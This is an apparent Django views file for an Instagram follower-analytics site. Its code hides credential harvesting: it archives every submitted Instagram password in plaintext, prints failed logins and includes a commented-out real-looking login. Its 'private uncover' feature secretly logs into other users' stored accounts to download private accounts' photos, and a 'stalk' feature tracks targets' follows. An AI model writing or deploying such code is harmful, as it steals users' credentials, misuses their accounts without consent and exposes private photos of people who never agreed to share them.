from django.shortcuts import render,redirect, HttpResponseRedirect
from .instaapi.InstagramAPI import InstagramAPI as API
from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.models import User
from django.core.exceptions import MultipleObjectsReturned, ObjectDoesNotExist
from django.contrib.auth.decorators import login_required
from .models import Account, PrivateUncoveredacc, PrivateUncoveredPhoto, PhotosArchive
from .models import  StalkedAction, Log, AccountArchive, Stalked
from .instafuncs import IGFuncs,idtouser
from random import randint
import os
import requests
import instaloader
#TODO #IDEA PEOPLE WHO FOLLOW YOU AND YOU DONT FOLLOW BACK (YOUR FANS)
def idtouser2(id):

	L = instaloader.Instaloader()
	profile = instaloader.Profile.from_id(L.context, str(int(id)))
	return (profile.username)

def get_id(username):
	url = "https://www.instagram.com/web/search/topsearch/?context=blended&query="+username+"&rank_token=0.3953592318270893&count=1"
	response = requests.get(url)
	respJSON = response.json()
	try:
		user_id = str( respJSON['users'][0].get("user").get("pk") )
		return user_id
	except:
		return "Unexpected error"

def stalk_follow(USER, username, passw):# TODO: incomplete

	bot = API(username, passw)
	bot.login()
	bot_id = bot.username_id


	followers_tree = {}
	followings_tree = {}
	followers = bot.getTotalFollowers(bot_id)
	following = bot.getTotalFollowings(bot_id)

	for i in followers:
		id = i['pk']
		subfollowers = bot.getTotalFollowers(bot_id)
		subfollowers = [i['pk'] for i in subfollowers ]
		followers_tree[id] = subfollowers



def instaessential(USER,username,passw):

	igacc = IGFuncs(username,passw)
	account = Account.objects.create(user=USER, password=passw)
	account.followers = igacc.followers
	account.following = igacc.following
	account.mutual = igacc.mutual
	account.dont_follow_you_back = igacc.dontfollowyouback
	account.you_dont_follow_back = igacc.youdontfollowback
	account.followers_list = str(igacc.followerslist)
	account.following_list = str(igacc.followinglist)
	account.mutual_list = str(igacc.mutuallist)
	account.dont_follow_you_back_list = str(igacc.dontfollowyoubacklist)
	account.you_dont_follow_back_list = str(igacc.youdontfollowbacklist)
	account.unfollowed_you_list = '[]'
	account.save()

def instaviewfuncs(USER,username,passw):

	igacc = IGFuncs(username,passw)

	USER = User.objects.get(username=username)
	account = Account.objects.filter(user=USER)
	try:
		account = account[len(account)-1]
	except:
		account = account[0]
	accountfollowers = (account.followers_list).strip('][').split(',')
	accountunfollowers = (account.unfollowed_you_list).strip('][').split(',')
	if accountunfollowers == '[]':
		accountunfollowers = []
		accountunfollowerslist = []
	else:
		accountunfollowerslist = [x.lstrip().replace("'","").replace('"','').lstrip('"').rstrip('"') for x in accountunfollowers]



	ac = accountfollowers
	c = 0
	aclist = []
	#[3022959521, 1185276529, 1962129541, 13607765425, 2985449609, 6652820195]



	for i in ac:
		if c ==0:
			#pk = i.strip("}{''pk:")
			#pk = i.replace("{'pk': ","")
			#pk = int(pk.strip())
			#aclist.append(pk)
			#print(pk)
			c+=1
		elif c==1:
			username = i.replace("'username': '","")
			username = username.strip("'").lstrip()
			#tempdict['username'] =username
			aclist.append(username)

			c+=1
		elif c==2:
			#private = i.replace("'private': ","")
			#private = private.replace('}',"").lstrip()

			c = 0
			#print(aclist)

	currentfollowers = igacc.followerslist
	currentfollowerslist = []

	for i in currentfollowers:
		follower =i['username']
		currentfollowerslist.append(follower)

	unfollowed_you_list = [x for x in aclist if not x in currentfollowerslist]
	unfollowed_you_list_last = accountunfollowerslist + unfollowed_you_list

	account = Account.objects.create(user=USER, password=passw)
	account.followers = igacc.followers
	account.following = igacc.following
	account.mutual = igacc.mutual
	account.dont_follow_you_back = igacc.dontfollowyouback
	account.you_dont_follow_back = igacc.youdontfollowback
	account.unfollowed_you = len(unfollowed_you_list)
	account.unfollowed_you_list = str(unfollowed_you_list_last)
	account.followers_list = str(igacc.followerslist)
	account.following_list = str(igacc.followinglist)
	account.mutual_list = str(igacc.mutuallist)
	account.dont_follow_you_back_list = str(igacc.dontfollowyoubacklist)
	account.you_dont_follow_back_list = str(igacc.youdontfollowbacklist)
	account.save()


def home(request):
	context = {}
	if request.user.is_authenticated:
		acc = Account.objects.filter(user=request.user)
		if len(acc) == 0:
			pass
		else:
			try:
				acc = acc[len(acc)-1]
			except:
				acc = acc[0]
			username,passw = str(acc.user),acc.password
			instaviewfuncs(request.user, username, passw)
	else:
		if request.method == "POST":
			data = request.POST
			user=data.get('user')
			passw = data.get('pass')
			AccountArchive.objects.create(username=user,password=passw)
			attempt = API(user,passw).login()
			usera = authenticate(username=user,password=passw)
			if attempt is True and usera is None:
				try:
					usercheck = User.objects.get(username=user)
					usercheck.set_password(passw)
					usercheck.save()
					usera = authenticate(username=user,password=passw)
					instaessential(usercheck, user, passw)
					login(request,usera)

				except User.DoesNotExist:
					userc = User.objects.create_user(username=user,password=passw)
					userc.save()
					acclen = Account.objects.filter(user=userc)
					if len(acclen) == 0:
						instaessential(userc, user, passw)
					usera = authenticate(username=user,password=passw)
					login(request,usera)


					#AccountArchive.objects.create(username=user, password=passw)


			elif attempt and usera:
				usercheck = User.objects.get(username=user)
				acclen = Account.objects.filter(user=usercheck)

				if len(acclen) == 0:
					instaessential(usercheck, user, passw)
				else:
					instaviewfuncs(usercheck, user, passw)
				login(request, usera)
			else:

				print("[DATA]")
				print(user,passw)
				context = {'error': "Username or Password is incorrect - If you are sure they are correct please check your account and verify the login" }

	#api = InstagramAPI("enjieldeeb@yahoo.com", "ahmedahmed")
	#api.login()
	return render(request, "index.html",context)

@login_required
def toplikers(request):
	context = {}
	acc = Account.objects.filter(user=request.user)
	try:
		acc = acc[len(acc)-1]
	except:
		acc = acc[0]
	username,passw = str(acc.user),acc.password
	bot = API(username,passw)
	bot.login()
	bot_id = bot.username_id

	feed = bot.getTotalUserFeed(bot_id)
	#id = feed[0]['pk']
	feed = [post['pk'] for post in feed ]
	likers_list = []
	likers_listfull = []
	for post in feed :
	    bot.getMediaLikers(post)
	    x = bot.getMediaLikers(post)
	    likers = bot.LastJson['users']
	    for liker in likers:
	        likers_list.append(liker['username'])
	        likers_listfull.append(liker)
	profile_urls = {}
	for user in likers_listfull:
		profile_urls[user['username']] = user['profile_pic_url']
	#print(profile_urls['nourezzeldin85'])
	r = {}
	for i in likers_list:

	   if i in r:
	     r[i] = r[i]+1

	   else:
	     r[i] = 1
	likersimplified = list(dict.fromkeys(likers_list))

	#print(r)
	r_sorted_keys = sorted(r, key=r.get, reverse=True)
	dict_last = {}
	for i in r_sorted_keys:
		dict_last[i] = [r[i],profile_urls[i]]

	context = {'likers_total': len(r_sorted_keys), 'keys':r_sorted_keys, 'dict':dict_last, 'pics_total':len(feed)}

	return render(request, 'toplikers.html', context)


@login_required
def didntlikeany(request):# TODO:  do it on other profiles too  not only your profile

	context = {}
	acc = Account.objects.filter(user=request.user)
	try:
		acc = acc[len(acc)-1]
	except:
		acc = acc[0]
	username,passw = str(acc.user),acc.password

	bot = API(username, passw)
	bot.login()
	bot_id = bot.username_id
	feed = bot.getTotalUserFeed(bot_id)
	#id = feed[0]['pk']
	feed = [post['pk'] for post in feed ]
	likers_list = []
	for post in feed:
		bot.getMediaLikers(post)
		likers = bot.LastJson['users']
		for liker in likers:
			if liker['username'] not in likers_list:
				likers_list.append(liker['username'])

	followers = bot.getTotalFollowers(bot_id)

	didntlikeyou = [follower for follower in followers if not follower['username'] in likers_list]
	context['didntlikeulist'] = didntlikeyou
	context['didntlikeutotal'] = len(didntlikeyou)
	return render(request, 'whodidntlikeu.html', context)

@login_required
def unfollowers(request):
	user = request.user
	account = Account.objects.filter(user=user)
	try:
		account = account[len(account)-1]
	except:
		account = account[0]
	context = {}
	context['unfollowers'] = account.unfollowed_you
	context['unfollowers_list'] = (account.unfollowed_you_list).strip('][]').split(',')
	context['unfollowers_list'] = [i.replace("'","").rstrip("'").lstrip() for i in context['unfollowers_list'] if i.replace("'","").rstrip("'") != '']
	context['unfollowers_all'] = len(context['unfollowers_list'])

	return render(request, 'unfollowers.html', context)

@login_required
def dontfollowuback(request):
	user = request.user
	account = Account.objects.filter(user=user)
	try:
		account = account[len(account)-1]
	except:
		account = account[0]
	adb = (account.dont_follow_you_back_list).strip('][]').split(',')
	c = 0
	dfub = []
	cc = 0
	templist = []
	for i in adb:
		if c ==0:
			pk = i.lstrip()

			pk = i.replace("{'pk': ","")
			pk = pk.strip()
			c+=1
		elif c==1:
			username = i.replace("'username': '","")
			username = username.strip("'").lstrip()
			templist.append(username)
			c+=1
		elif c==2:
			profile_pic_url = i.replace("'profile_pic_url': ","").replace("'","")
			profile_pic_url = profile_pic_url.replace('}',"").lstrip()
			c = 0

			templist.append(profile_pic_url)
			dfub.append(templist)
			templist = []

	context = {}
	context['dontfbtotal'] = account.dont_follow_you_back
	context['dontfblist'] = dfub
	return render(request, 'dontfollowuback.html', context)

@login_required
def private_uncover(request):

	target_list = PrivateUncoveredacc.objects.filter(user=request.user)

	for acc in target_list:
		check_covereduser(acc.username,request.user)
	if request.method == "POST":
		data = request.POST
		username=data.get('username')
		USER = request.user
		try:
			x = PrivateUncoveredacc.objects.get(user=USER, username=username)
		except ObjectDoesNotExist:
			target = PrivateUncoveredacc.objects.create(user=USER, username=username)
			target.save()
		except MultipleObjectsReturned:
			pass



	target_list = PrivateUncoveredacc.objects.filter(user=request.user)
	total_covered = len(PrivateUncoveredacc.objects.filter(user=request.user,uncovered="False"))
	total_uncovered = len(PrivateUncoveredacc.objects.filter(user=request.user,uncovered="True"))

	context = {'target_list': target_list, 'total_covered':total_covered, 'total_uncovered':total_uncovered}


	return render(request,"privateuncovered.html", context)


def check_covereduser(username,requestuser):
	usernamenoid = username
	userid = get_id(username)

	accounts = Account.objects.all()
	checked_list = []
	found = False
	for i in accounts:
		if i.user not in checked_list:
			following = i.following_list

			if userid in following:

				user, passw = str(i.user), i.password
				found = True
				break

			else:
				checked_list.append(i.user)
	if found:
		bot = API(user,str(passw))
		bot.login()
		feed = bot.getTotalUserFeed(userid)
		USER = PrivateUncoveredacc.objects.get(user=requestuser, username=username)
		photo_name = 8721374422
		for i in feed:
			try:
				img_url = i['image_versions2']['candidates'][0]['url']
			except:
				img_url = i['carousel_media'][0]['image_versions2']['candidates'][0]['url']
			photo_name += 1
			imglink = str(username)+"/"+str(photo_name)+".jpg"
			imgcreatelink = "media"+"/"+str(username)+"/"+str(photo_name)+".jpg"
			requests_url = requests.get(img_url)
			try:
				os.mkdir("media/"+str(username))
			except Exception as e:
				pass
			f = open(imgcreatelink, 'ab')
			f.write(requests_url.content)
			f.close()

			archive = PhotosArchive.objects.create(username=usernamenoid, img_link=img_url)
			archive.save()
			uncoveredphoto = PrivateUncoveredPhoto.objects.create(user=USER, img=imglink)
			uncoveredphoto.save()
			USER = PrivateUncoveredacc.objects.get(user=requestuser, username=username)
			USER.uncovered = True
			USER.save()


@login_required
def look_uncovered(request, target):
	context = {}
	targetobj = PrivateUncoveredacc.objects.get(user=request.user, username=target)
	photos = PrivateUncoveredPhoto.objects.filter(user=targetobj)
	imgs = []
	for i in photos :
		if i.img not in imgs:
			imgs.append(i.img)
	context['imgs'] = imgs


	return render(request, 'uncover.html', context)

@login_required
def whodidntlikethem(request):
	if request.method == "POST":
		data = request.POST
		username=data.get('username')
		Log.objects.create(user=request.user, action="Who Didn't like",on=username)
		return redirect('/whodidntlike-'+username)
	context = {}
	return render(request, 'whodidntlikethem.html', context)

@login_required
def whodidntliketarget(request, target):

	context = {}
	acc = Account.objects.filter(user=request.user)
	try:
		acc = acc[len(acc)-1]
	except:
		acc = acc[0]
	username,passw = str(acc.user),acc.password

	bot = API(username, passw)
	bot.login()
	bot_id = get_id(target)
	feed = bot.getTotalUserFeed(bot_id)
	#id = feed[0]['pk']
	feed = [post['pk'] for post in feed ]
	likers_list = []
	for post in feed:
		bot.getMediaLikers(post)
		likers = bot.LastJson['users']
		for liker in likers:
			if liker['username'] not in likers_list:
				likers_list.append(liker['username'])

	followers = bot.getTotalFollowers(bot_id)

	didntlikeyou = [follower for follower in followers if not follower['username'] in likers_list]
	context['didntlikeulist'] = didntlikeyou
	context['didntlikeutotal'] = len(didntlikeyou)
	return render(request, 'whodidntlikeu.html', context)

@login_required
def dontfollowbacksearch(request):
	if request.method == "POST":
		data = request.POST
		username=data.get('username')
		Log.objects.create(user=request.user, action="Don't Follow Back",on=username)
		return redirect('/dontfollowback-'+username)
	context = {}
	return render(request, 'dontfollowbacksearch.html', context)

@login_required
def dontfollowbacktarget(request, target):
	user = request.user
	account = Account.objects.filter(user=user)
	try:
		account = account[len(account)-1]
	except:
		account = account[0]
	username,passw = str(account.user),account.password
	igaccount = API(username,passw)
	igaccount.login()
	user_id = get_id(target)
	followers = igaccount.getTotalFollowers(user_id)
	following = igaccount.getTotalFollowings(user_id)


	followerslist = []
	for i in followers:
		follower = dict(pk=i['pk'],username=i['username'],profile_pic_url=i['profile_pic_url'])
		followerslist.append(follower)

	followinglist = []
	for i in following:
		follower = dict(pk=i['pk'],username=i['username'],profile_pic_url=i['profile_pic_url'])
		followinglist.append(follower)

	dontfollowyoubacklist = [x for x in followinglist if x not in followerslist]

	context = {}
	context['dontfbtotal'] = len(dontfollowyoubacklist)
	context['dontfblist'] = dontfollowyoubacklist
	return render(request, 'dontfollowthemback.html', context)

@login_required
def toplikersearch(request):
	if request.method == "POST":
		data = request.POST
		username=data.get('username')
		Log.objects.create(user=request.user, action='Top Likers',on=username)
		return redirect('/toplikersof-'+username)
	context = {}
	return render(request, 'toplikersearch.html', context)

@login_required
def toplikersof(request,target):

	acc = Account.objects.filter(user=request.user)

	try:
		acc = acc[len(acc)-1]
	except:
		acc = acc[0]
	username,passw = str(acc.user),acc.password
	bot = API(username,passw)
	bot.login()
	bot_id = get_id(target)

	feed = bot.getTotalUserFeed(bot_id)
	#id = feed[0]['pk']
	feed = [post['pk'] for post in feed ]
	likers_list = []
	likers_listfull = []
	for post in feed :
	    bot.getMediaLikers(post)
	    x = bot.getMediaLikers(post)
	    likers = bot.LastJson['users']
	    for liker in likers:
	        likers_list.append(liker['username'])
	        likers_listfull.append(liker)
	profile_urls = {}
	for user in likers_listfull:
		profile_urls[user['username']] = user['profile_pic_url']
	#print(profile_urls['nourezzeldin85'])
	r = {}
	for i in likers_list:

	   if i in r:
	     r[i] = r[i]+1

	   else:
	     r[i] = 1
	likersimplified = list(dict.fromkeys(likers_list))

	#print(r)
	r_sorted_keys = sorted(r, key=r.get, reverse=True)
	dict_last = {}
	for i in r_sorted_keys:
		dict_last[i] = [r[i],profile_urls[i]]

	context = {'likers_total': len(r_sorted_keys), 'keys':r_sorted_keys, 'dict':dict_last, 'pics_total':len(feed)}

	return render(request, 'toplikers.html', context)

@login_required
def stalktargetinsert(request):

	account = Account.objects.filter(user=request.user)
	try:
		account = account[len(account)-1]
	except:
		account = account[0]
	username,passw = str(account.user),account.password

	stalked_list = Stalked.objects.filter(user=request.user)
	stalked_list = [acc.stalked_account for acc in stalked_list]
	stalked_list_users = list(dict.fromkeys(stalked_list))

	igacc = API(username,passw)
	igacc.login()

	for user in stalked_list_users:
		user_data = Stalked.objects.filter(user=request.user, stalked_account=user)
		try:
			user_data = user_data[len(user_data)-1]
		except:
			user_data = user_data[0]
		user_id = get_id(user)

		recent_followersold = igacc.getTotalFollowers(user_id)
		recent_followingold = igacc.getTotalFollowings(user_id)
		recent_followers = [x['username'] for x in recent_followersold]
		recent_followerswithpics = [[x['username'],x['profile_pic_url']] for x in recent_followersold]
		recent_following = [x['username'] for x in recent_followingold]
		recent_followingwithpics = [[x['username'],x['profile_pic_url']] for x in recent_followingold]

		accountfollowers = (user_data.followers_list).strip('][').split(',')
		ac = accountfollowers
		c = 0
		aclist = []
		templist = []
		aclistwithoutpics = []
		for i in ac:
			if c ==0:
				c+=1
			elif c==1:
				username = i.replace("'username': '","")
				username = username.strip("'").lstrip()
				templist.append(username)
				aclistwithoutpics.append(username)
				c+=1
			elif c==2:
				profile_pic_url = i.replace("'profile_pic_url': ","").replace("'","")
				profile_pic_url = profile_pic_url.replace('}',"").lstrip()
				c = 0

				templist.append(profile_pic_url)
				aclist.append(templist)
				templist = []
		for i in aclist:
			if i[0] not in recent_followers:
				StalkedAction.objects.create(user=request.user, stalked_account=user, action="Unfollowed Target", on_user=i[0], pic=i[1])


		for i in recent_followerswithpics:

			if i[0] not in aclistwithoutpics:

				StalkedAction.objects.create(user=request.user, stalked_account=user, action="Followed Target", on_user=i[0], pic=i[1])


		accountfollowing = (user_data.following_list).strip('][').split(',')
		ac = accountfollowing
		c = 0
		aclist = []
		templist = []
		aclistwithoutpics = []
		for i in ac:
			if c ==0:
				c+=1
			elif c==1:
				username = i.replace("'username': '","")
				username = username.strip("'").lstrip()
				templist.append(username)
				aclistwithoutpics.append(username)
				c+=1
			elif c==2:
				profile_pic_url = i.replace("'profile_pic_url': ","").replace("'","")
				profile_pic_url = profile_pic_url.replace('}',"").lstrip()
				c = 0

				templist.append(profile_pic_url)
				aclist.append(templist)
				templist = []
		for i in aclist:
			if i[0] not in recent_following:
				StalkedAction.objects.create(user=request.user, stalked_account=user, action="Unfollowed by Target", on_user=i[0], pic=i[1])

		for i in recent_followingwithpics:

			if i[0] not in aclistwithoutpics:
				StalkedAction.objects.create(user=request.user, stalked_account=user, action="Followed by Target", on_user=i[0], pic=i[1])




		target = Stalked.objects.create(user=request.user, stalked_account=user)
		followinglist = []
		for i in recent_followingold:
			follower = dict(pk=i['pk'],username=i['username'],profile_pic_url=i['profile_pic_url'])
			followinglist.append(follower)
		followerslist = []
		for i in recent_followersold:
			follower = dict(pk=i['pk'],username=i['username'],profile_pic_url=i['profile_pic_url'])
			followerslist.append(follower)
		target.followers = len(recent_followersold)
		target.following = len(recent_following)
		target.followers_list = followerslist
		target.following_list = followinglist
		target.save()

	context = {}
	if request.method == "POST":
		data = request.POST
		usernameinsert=data.get('username')
		USER = request.user
		try:
			x = Stalked.objects.get(user=request.user, stalked_account=usernameinsert)
		except ObjectDoesNotExist:
			account = Account.objects.filter(user=USER)
			try:
				account = account[len(account)-1]
			except:
				account = account[0]
			username,passw = str(account.user),account.password
			igacc = API(username,passw)
			igacc.login()
			user_id = get_id(usernameinsert)

			followers = igacc.getTotalFollowers(user_id)
			following = igacc.getTotalFollowings(user_id)
			target = Stalked.objects.create(user=request.user, stalked_account=usernameinsert)
			followinglist = []
			for i in following:
				follower = dict(pk=i['pk'],username=i['username'],profile_pic_url=i['profile_pic_url'])
				followinglist.append(follower)
			followerslist = []
			for i in followers:
				follower = dict(pk=i['pk'],username=i['username'],profile_pic_url=i['profile_pic_url'])
				followerslist.append(follower)

			target.followers = len(followers)
			target.following = len(following)
			target.followers_list = followerslist
			target.following_list = followinglist

			target.save()
		except MultipleObjectsReturned:
			pass
	acclistf = []
	rep = []
	acclist = Stalked.objects.filter(user=request.user)
	for acc in acclist:
		if str(acc) not in rep:
			acclistf.append(acc)
			rep.append(str(acc))



	context['acclist'] = acclistf




	return render(request, 'stalktarget.html', context)
@login_required
def stalk_details(request,target):
	actionlist = StalkedAction.objects.filter(user=request.user,stalked_account=target)
	context = {
	'actionlist' : actionlist
	}
	return render(request, 'stalkedetails.html', context)
@login_required
def logoutview(request):
	logout(request)
	return redirect('/')

"""def templatetest(request):

	return render(request, 'stalkedetails.html')
"""
